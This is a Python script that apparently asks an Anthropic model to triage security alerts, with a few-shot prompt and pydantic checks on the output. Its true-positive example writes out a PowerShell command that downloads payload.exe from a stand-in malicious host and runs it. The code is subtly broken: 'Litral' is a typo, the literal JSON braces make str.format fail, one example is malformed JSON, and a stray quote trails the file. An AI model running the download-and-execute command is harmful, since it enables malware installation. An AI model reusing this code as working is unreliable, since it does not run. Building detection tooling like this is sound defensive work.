import json 
from dotenv import load_dotenv
import anthropic
#AI output validation
from pydantic import BaseModel, ValidationError
from typing import Literal

class Triage(BaseModel):
    severity: Literal["low", "medium", "high", "critical"]
    verdict: Litral["true_positive", "false_positive", "needs_review"]
    suspected_techniques: list[str]
    reasoning: str

def triage(alert):
    #2 attempts
    for attempt in range(2):
        try:
            raw = triage_raw(alert)
            data = parse_json(raw)
            return Triage(**data) #raises ValidationError if the schema is wrong
        except ValidationError:
            print(f"Validation failed.  Attempt {attempt + 1}/2")
            #if second attempt, raise the error
            if attempt == 1:
                raise 

load_dotenv()
client=anthropic.Anthropic()

TRIAGE_PROMPT = """You are a SOC triage assistant.

Here are examples of how to classify alerts:
Example 1 - False positive:

Event: 
{
    "user:"admin",
    "process": "powershell.exe",
    "command": "Get-Service"
}
Response:
{
    "severity": "low",
    "verdict": "false_positive",
    "suspected_techniques": [],
    "reasoning": "The command is a normal administrative action and does not show malicious behaviour"
}

Example 2 - True positive:
Event
{
    "role": "unknown",
    "process": "powershell.exe",
    "command": "Invoke-WebRequest http://malicious-site.com/payload.exe; \
    Start-Process payload.exe"
}
Response:
{
    "severity": "high",
    "verdict": "true_positive",
    "suspected_techniques": [
        "Command and Scripting Interpreter", 
        "Ingress Tool Tranfer"
    ],
    "reasoning": "The event shows suspicious PowerShell execution download and \
    running a payload."
}

Now, analyze this security event according to SOC triage principles and the examples\
 given above. Consider whether the activity is expected administrator behaviour or \
 potentially malicious.
 Use "true_positive" when there is clear evidence of suspicious activity or malicious\
  activity.
 Use false positive only when the activity appears legitimate and expected. 
 If the available evidence isn't enough to decide one way or the other, use \
 "needs_review".

Event:
{event}

Remember to respond with ONLY a JSON object (on prose, no markdown fences) with\
 exactly these keys:
- "severity": one of "low", "medium", "high", "critical"
- "verdict": one of "true_positive", "false_positive", "needs_review"
- "suspected_techniques": array of MITRE ATT&CK technique names (strings)
- "reasoning": one short paragraph
"""

def triage_raw(alert):
    resp = client.messages.create(
        model="claude-haiku-4-5",
        max_tokens = 500,
        messages = [
            {
                "role":"user",
                "content":TRIAGE_PROMPT.format(event=json.dumps(alert, indent=2))
            },
            {"role": "assistant", "content": "{"
            } #forces JSON
            ]            
    )
    return "{" + resp.content[0].text

#parser
def parse_json(raw):
    raw = raw.strip()
    if raw.startswith("```"):
        raw = raw.split("```")[1].removeprefix("json").strip()
    return json.loads(raw)

if __name__ == "__main__":
    with open("sample_alerts.json") as f:
        alerts = json.load(f)
    
    for i, alert in enumerate(alerts):
        result = triage(alert)
        
        print(f"\n--- Alert {i+1} ---")
        print(result)

#raw vs parsed testing
#    triaged = triage_raw(alert[0])
#    print ("RAW: ")
#    print (triaged)

#    parsed = parse_json(raw)

#    print("\nPARSED: ")
#    print(parsed)"""



